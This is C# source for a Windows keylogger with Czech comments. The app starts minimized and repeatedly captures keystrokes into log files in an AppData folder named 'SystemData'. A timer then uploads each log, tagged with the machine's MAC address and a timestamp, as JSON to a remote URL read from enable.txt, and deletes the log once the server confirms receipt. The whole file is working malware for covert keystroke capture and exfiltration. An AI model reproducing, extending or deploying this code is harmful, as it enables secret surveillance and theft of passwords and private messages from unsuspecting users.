using KeyLogger;
using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.NetworkInformation;
using System.Net.Http;
using System.Reflection.Emit;

namespace keylogger
{
    public partial class Form1 : Form
    {
        private string cesta;
        private HttpClient httpClient;
        public Form1()
        {
            InitializeComponent();
        }
        private void tCheckKey_Tick(object sender, EventArgs e)
        {
            if (!File.Exists("enable.txt"))
            {
                Close();
            }
            //zápis do textboxu
            tbLog.Text += Key.GetBuffKeys();
            tbLog.Text = Key.ReplaceChars(tbLog.Text);
        }

        private void tWriteKeys_Tick(object sender, EventArgs e)
        {
            //zápis do souboru            
            if (!Directory.Exists(cesta))
                Directory.CreateDirectory(cesta);
            bool cyk = true;
            int i = 0;
            string jmeno = "";
            while (cyk)
            {
                i++;
                jmeno = Path.Combine(cesta, "data" + i.ToString() + ".txt");
                //vytvor
                cyk = false;
                if (File.Exists(jmeno))
                {
                    cyk = true;
                    FileInfo fi = new FileInfo(jmeno);
                    if (fi.Length <= 83886080)
                    {
                        cyk = false;
                    }
                }

            }
            try
            {
                using (StreamWriter sw = new StreamWriter(jmeno, true))
                {
                    sw.Write(tbLog.Text);
                    tbLog.Text = "";
                }
            }
            catch
            { 
            }
        }

        private async void tUploadData_Tick(object sender, EventArgs e)
        {
            string file;
            using (StreamReader streamReader = new StreamReader("enable.txt"))
            {
                file = streamReader.ReadToEnd().Trim();
            }
            Uri url;
            if (Uri.TryCreate(file, UriKind.Absolute, out url))
            {
                try
                {
                    //nalezení souboru
                    int i = 0;
                    string jmeno = "";
                    do
                    {
                        i++;
                        jmeno = Path.Combine(cesta, "data" + i.ToString() + ".txt");
                    } while (File.Exists(jmeno));
                    i--;
                    jmeno = Path.Combine(cesta, "data" + i.ToString() + ".txt");
                    string data;
                    using (StreamReader streamReader = new StreamReader(jmeno, Encoding.UTF8))
                    {
                        data = streamReader.ReadToEnd();
                    }
                    string macAddr = (from nic in NetworkInterface.GetAllNetworkInterfaces() where nic.OperationalStatus == OperationalStatus.Up select nic.GetPhysicalAddress().ToString()).FirstOrDefault();
                    string json = string.Format("{{\"mac\":\"{0}\",\"datetime\":\"{1}\",\"data\":\"{2}\"}}", macAddr, DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), data);
                    using (StreamWriter streamWriter = new StreamWriter("text.txt"))
                    {
                        streamWriter.WriteLine(json);
                    }
                    StringContent stringContent = new StringContent(json);
                    HttpResponseMessage httpResponseMessage = await httpClient.PostAsync(url, stringContent);
                    string s = httpResponseMessage.Content.ReadAsStringAsync().Result;
                    //MessageBox.Show(s);
                    if (s.Contains("<body>\n1</body>"))
                    {
                        File.Delete(jmeno);
                    }
                }
                catch { }
            }

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            tCheckKey.Start();
            tWriteKeys.Start();
            tUploadData.Start();
            WindowState = FormWindowState.Minimized;
            httpClient = new HttpClient();
            cesta = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemData");
        }
    }
}
